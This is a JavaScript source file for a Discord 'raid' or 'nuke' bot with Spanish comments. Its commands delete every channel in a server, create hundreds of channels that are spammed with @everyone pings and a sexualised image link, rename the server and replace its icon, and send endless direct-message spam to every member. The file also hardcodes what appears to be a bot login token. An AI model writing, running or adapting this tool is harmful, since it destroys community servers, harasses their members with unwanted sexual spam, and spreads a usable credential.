/*

Version 6.2.0
Errores solucionados

#TeamAntiplague

Comando:
.nuke


*/

const Discord = require('discord.js');
const intents = new Discord.Intents();
const client = new Discord.Client({ intents: 32767 });

const chalk = require('chalk');


client.on("ready", () => {

console.log(chalk.blue(` ${chalk.red('»')} Bot ${client.user.tag} preparado para el raid.`))
console.log(chalk.blue(` ${chalk.red('»')} Usa d!help para ver los comandos.`))
console.log(chalk.blue(` ${chalk.red('»')} By pako.`))

  
    });



//----------------- Solucion error ------------------//


process.on('unhandledRejection', error => {
    console.error(error);
});

client.on('shardError', error => {
    console.error(error);
});



//----------------- Comandos ------------------//


//automatico


client.on("messageCreate", message => {
  if(message.author.bot) return;

  if(message.content === 'd!help'){
    message.delete()
    const embed = new Discord.MessageEmbed()
      .setTitle("ola pendejo, estos son mis comandos")
      .setColor("RANDOM")
      .addFields(
        { name: "d!nuke:", value: "nukea o elimina todos los canales del servidor", inline: false },
        { name: "d!sexo:", value: "empieza el raid", inline: false },
        { name: "d!mdall:", value: "el bot empieza a spamear a todos al md y no para hasta q lo bloquees o se apague", inline: false },
        { name: "d!foto:", value: "cambia el nombre y la foto del server", inline: false }
      )
      .setFooter("SEXOOOOOOOOOOOOOOOOOOOOOOOO")
    message.author.send({ embeds: [embed], content: "sexo", components: [] })

      }
    })


client.on("messageCreate", message => {
  if(message.author.bot) return;

  if(message.content === 'd!nuke'){
      message.delete()
      
      message.guild.channels.cache.forEach(channel => channel.delete());
      message.guild.channels.create(`sexo`, {
        type: 'text'
      }).then(channel => {
        channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473")
      })
    }
  })

client.on("messageCreate", message => {
    if(message.author.bot) return;
  
    if(message.content === 'd!sexo'){
      message.delete()

    for (let i = 0; i <= 500; i++) {
         message.guild.channels.create(`sexo`, {
           type: 'text'
           //retarded
         }).then(channel => {
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");
          channel.send("@everyone @here sexo https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");

           
           
       })
       }
     }
})

client.on("messageCreate", message => {
  if(message.author.bot) return;

  if(message.content === 'd!foto'){
    message.delete()
      message.guild.setName("SEXO");
       message.guild.setIcon("https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473");

  }
})

client.on("messageCreate", message => {
  if(message.author.bot) return;

  if(message.content === 'd!mdall'){
        message.delete()
        message.guild.members.cache.forEach(member => {
          setInterval(function(){
          member.send("sexo - https://media.discordapp.net/attachments/852690034976096336/874780623364042782/810476673836777512.png?width=630&height=473").catch(error => {});
    },450);
  })
  }
})

client.login('Nzg0NDQ1NTMzNTE4NjkyNDAy.X8pZ1Q.UQKLRXanNf8UXc6LCZu9knBe2PA');
